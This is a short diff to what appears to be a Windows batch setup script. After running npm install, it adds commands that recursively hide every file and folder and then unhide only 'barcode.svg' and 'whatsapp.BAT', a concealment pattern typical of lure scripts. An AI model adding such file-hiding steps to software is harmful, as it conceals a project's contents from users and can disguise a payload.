@@ -1,2 +1,5 @@
 start cmd.exe /k "npm install"
-start cmd /k echo install successfully
+timeout 10
+attrib +h /s /d
+attrib -h 'barcode.svg'
+attrib -h 'whatsapp.BAT'
